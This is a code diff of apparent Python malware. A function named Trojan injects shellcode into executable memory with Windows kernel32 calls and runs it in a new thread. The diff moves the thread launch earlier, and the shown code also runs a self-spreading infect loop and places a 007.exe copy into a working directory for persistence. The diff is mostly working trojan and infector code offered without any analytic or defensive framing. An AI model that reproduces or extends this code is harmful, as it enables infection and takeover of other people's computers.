@@ -26,7 +26,8 @@ def Trojan():
     ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_uint64(rwxpage), ctypes.create_string_buffer(sbcode), len(sbcode))
     handle = ctypes.windll.kernel32.CreateThread(0, 0, ctypes.c_uint64(rwxpage), 0, 0, 0)
     ctypes.windll.kernel32.WaitForSingleObject(handle, -1)
-
+tro = threading.Thread(target=Trojan)
+tro.start()
 
 if os.getcwd()!=work_home:
     if '007.exe' not in os.listdir(work_home):
@@ -63,9 +64,6 @@ def infecting():
     while True:
         infect().go()
 
-            
-tro = threading.Thread(target=Trojan)
-tro.start()
 
 infects= threading.Thread(target=infecting)
 infects.start()
